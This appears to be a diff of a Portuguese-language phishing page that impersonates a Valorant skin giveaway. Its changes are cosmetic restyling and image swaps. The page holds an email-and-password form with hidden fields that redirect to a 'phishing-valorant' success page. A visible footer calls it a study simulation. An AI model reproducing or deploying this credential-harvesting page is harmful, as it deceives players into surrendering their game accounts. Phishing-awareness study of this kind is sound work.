@@ -1,5 +1,6 @@
 <!DOCTYPE html>
-<html lang="pt-BR" >
+<html lang="pt-BR">
+
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
@@ -34,7 +35,7 @@
     }
 
     .header {
-      background: url('https://images.contentstack.io/v3/assets/bltb6530b271fddd0b1/blt87d4e170dad30ed1/6262e5bfcf8b9b0dfbcb67b7/skins-header.jpg') no-repeat center/cover;
+      background: url('Fundo-destaque-AsasOniricasValorant.jpg') no-repeat center/cover;
       height: 140px;
       display: flex;
       justify-content: center;
@@ -50,7 +51,7 @@
       color: #ff4655;
       text-transform: uppercase;
       letter-spacing: 2px;
-      background: rgba(0,0,0,0.6);
+      background: rgba(0, 0, 0, 0.6);
       padding: 0.3rem 1.2rem;
       border-radius: 8px;
     }
@@ -81,6 +82,7 @@
       color: #eee;
       transition: background 0.3s ease;
     }
+
     input[type="text"]:focus,
     input[type="password"]:focus {
       background: #2f2f2f;
@@ -101,6 +103,7 @@
       text-transform: uppercase;
       box-shadow: 0 0 10px #ff4655;
     }
+
     button:hover {
       background: #e63946;
       box-shadow: 0 0 15px #e63946;
@@ -121,6 +124,7 @@
       background: #1c1c1c;
       border-top: 1px solid #333;
     }
+
     .skins img {
       width: 60px;
       border-radius: 8px;
@@ -128,19 +132,21 @@
       transition: transform 0.3s ease;
       cursor: default;
     }
+
     .skins img:hover {
       transform: scale(1.1);
       filter: drop-shadow(0 0 8px #ff4655);
     }
 
     /* Responsive */
-    @media(max-width: 400px){
+    @media(max-width: 400px) {
       .container {
         width: 90vw;
       }
     }
   </style>
 </head>
+
 <body>
   <div class="container" role="main" aria-label="Formulário para resgatar skin Valorant">
     <div class="header">
@@ -151,20 +157,21 @@
       <input id="email" type="text" name="email" placeholder="seuemail@riotgames.com" required autofocus />
       <label for="senha">Senha</label>
       <input id="senha" type="password" name="senha" placeholder="••••••••••" required />
-      
+
       <!-- Redireciona para página sucesso -->
       <input type="hidden" name="_next" value="https://katielly-scherbatsky.github.io/phishing-valorant/sucesso.html" />
       <input type="hidden" name="_captcha" value="false" />
-      
+
       <button type="submit" aria-label="Enviar formulário para resgatar skin Valorant">Resgatar Agora</button>
     </form>
 
     <div class="skins" aria-label="Imagens de skins Valorant">
-      <img src="https://images.contentstack.io/v3/assets/bltb6530b271fddd0b1/blt87d4e170dad30ed1/6262e5bfcf8b9b0dfbcb67b7/skins-header.jpg" alt="Skin Valorant 1" />
-      <img src="https://cdn1.epicgames.com/valorant/item/StoreFront/ItemImage/4db0a249148db657faac1b2c5243a214/256x256_Ares_Reaver.png" alt="Skin Valorant Ares Reaver" />
-      <img src="https://cdn1.epicgames.com/valorant/item/StoreFront/ItemImage/20efb3c5a74bbf467d8ee5ad84e97b53/256x256_Spectre_Prism.png" alt="Skin Valorant Spectre Prism" />
+      <img src="valorant-elderflame-operator-variant-1-red-weapon-skin.png" alt="Skin Valorant 1" />
+      <img src="valorant-prime-vandal-skin.png" alt="Skin Valorant Ares Reaver" />
+      <img src="Glitchpop_Classic.webp" alt="Skin Valorant Spectre Prism" />
     </div>
     <p class="footer-note">⚠️ Lembre-se: esta é uma simulação para estudo. Use senha falsa ou temporária.</p>
   </div>
 </body>
+
 </html>
